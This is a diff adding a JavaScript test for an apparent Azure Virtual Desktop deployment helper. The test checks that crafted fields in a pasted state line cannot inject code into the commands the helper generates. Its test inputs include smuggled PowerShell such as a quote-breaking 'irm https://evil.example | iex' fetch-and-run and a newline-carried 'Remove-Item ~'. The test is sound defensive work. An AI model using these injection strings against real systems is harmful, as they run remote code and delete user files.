@@ -959,6 +959,56 @@ test('settings: every value that enters a command is checked; a pasted context c
   for (const a of r.actions) assert.doesNotMatch(a.command, /irm|iex/);
 });
 
+// A pasted state line is untrusted (decision 0007). Every field of it that a command uses is checked, not only
+// the settings: a crafted paste yields no command carrying more than a value, and never other code to clone.
+test('crafted paste: no field of a state line puts more than a value into a command', () => {
+  const evil = "x'; irm https://evil.example | iex; '";
+  const state = (o) => '<<<AVDLZ-STATE ' + JSON.stringify(Object.assign({ v: 1, counts: {}, failures: [], warnings: [] }, o)) + ' AVDLZ-STATE>>>';
+  const commands = (r) => r.actions.map((a) => a.command).join('\n');
+  const clean = (r, what) => {
+    const all = commands(r);
+    assert.doesNotMatch(all, /evil|irm |iex/, what);
+    for (const m of all.matchAll(/git clone (\S+)/g)) assert.equal(m[1], 'https://github.com/avd-ops/avd-landing-zone.git', what + ': clone URL');
+    assert.doesNotMatch(all, /git checkout -q '(?!master)/, what + ': no pasted ref');
+  };
+  // Context keys that are not settings never reach the config.
+  const ctx = P.analyze(state({ stage: 'predeploy', status: 'ready', context: { repoUrl: 'https://github.com/evil/x', ref: 'evil', record: { runId: 'run-20261021-1200-abcd', mode: 'on' },
+    sizing: { hosts: '1; iex', vmSize: 'Standard_E4as_v5', maxSessions: 16, profileQuotaGiB: 100 }, power: { autoShutdownTime: '20:00; iex', startVmOnConnect: true } } }), {});
+  clean(ctx, 'context');
+  assert.equal(ctx.config.repoUrl, P.DEFAULTS.repoUrl);
+  assert.equal(ctx.config.ref, undefined);
+  assert.equal(ctx.config.record, undefined);
+  assert.equal(ctx.config.sizing, undefined);
+  assert.equal(ctx.config.power, undefined);
+  assert.deepEqual(ctx.rejectedSettings.sort(), ['power', 'sizing']);
+  // Check data: regions, quota items, another landing zone, a deployment name, a run ID, a user.
+  clean(P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [{ id: 'hostpool-region', check: 'Host pool region', data: { regions: [evil, 'eastus'] } }] }), {}, { rankedRegions: [evil] }), 'hostpool-region');
+  const hp = P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [{ id: 'hostpool-region', check: 'Host pool region', data: { regions: [evil, 'eastus'] } }] }), {}, { rankedRegions: [evil] });
+  assert.match(commands(hp), /-Location eastus /, 'the valid region is still offered');
+  clean(P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [{ id: 'lz-region', check: 'Region', data: { deployedIn: [evil] } }] }), {}), 'lz-region');
+  const q = P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: evil, location: 'eastus', limit: 10, used: 8, needed: 4 } },
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: 'standardEASv5Family', location: evil, limit: 10, used: 8, needed: 4 } },
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: 'standardEASv5Family', location: 'eastus', limit: '10\nRemove-Item ~', used: 8, needed: 4 } },
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: 'standardEASv5Family', location: 'eastus', limit: 10, used: 8, needed: 4 } }] }), {});
+  clean(q, 'quota');
+  assert.doesNotMatch(commands(q), /Remove-Item ~/, 'a number field cannot carry a line');
+  assert.equal((commands(q).match(/Invoke-AzRestMethod/g) || []).length, 1, 'only the valid quota item');
+  const lz = P.analyze(state({ stage: 'postdeploy', status: 'notready', failures: [{ id: 'lz-missing', check: 'Landing zone', data: { found: [{ namePrefix: evil, environment: 'dev' }, { namePrefix: 'other', environment: 'test', repoUrl: 'https://github.com/evil/x', usersGroup: evil }] } }] }), {});
+  clean(lz, 'lz-missing');
+  assert.match(commands(lz), /-NamePrefix other -Environment test/);
+  clean(P.analyze(state({ stage: 'deploy', status: 'started', context: { deploymentName: evil } }), {}), 'deploymentName');
+  clean(P.analyze(state({ stage: 'resume', status: 'failed', context: { lastStage: 'deploy', lastStatus: 'failed', deploymentName: evil } }), {}), 'resume deploymentName');
+  clean(P.analyze(state({ stage: 'recovery', status: 'passed', context: { test: true, mode: 'go', runId: evil } }), {}), 'recovery runId');
+  clean(P.analyze(state({ stage: 'recovery', status: 'failed', context: { test: true, mode: 'go', runId: evil } }), {}), 'recovery runId failed');
+  clean(P.analyze(state({ stage: 'verify', status: 'failed', context: { user: evil }, failures: [{ id: 'connect-errors', detail: 'x' }] }), {}), 'verify user');
+  // The validators keep real values.
+  assert.deepEqual(P.validSizing({ hosts: 2, vmSize: 'Standard_M128-64ms', maxSessions: 16, profileQuotaGiB: 100, activeHoursPerWeek: 50 }), { hosts: 2, vmSize: 'Standard_M128-64ms', maxSessions: 16, profileQuotaGiB: 100, activeHoursPerWeek: 50 });
+  assert.equal(P.validSizing({ hosts: 1.5, vmSize: 'Standard_E4as_v5', maxSessions: 16, profileQuotaGiB: 100 }), null);
+  assert.deepEqual(P.validPower({ autoShutdownTime: 'none', startVmOnConnect: false }), { startVmOnConnect: false, autoShutdownTime: 'none' });
+  assert.equal(P.validPower({ autoShutdownTime: '24:00' }), null);
+});
+
 test('version: the state line carries the scripts\' commit and the portal says when it differs from its own', () => {
   const state = (commit) => '<<<AVDLZ-STATE ' + JSON.stringify({ v: 1, stage: 'predeploy', status: 'ready', context: { location: 'eastus2', commit }, counts: {}, failures: [], warnings: [] }) + ' AVDLZ-STATE>>>';
   const same = P.analyze(state('abc1234'), {}, { portalCommit: 'abc1234def0123456789abcdef0123456789abcd' });
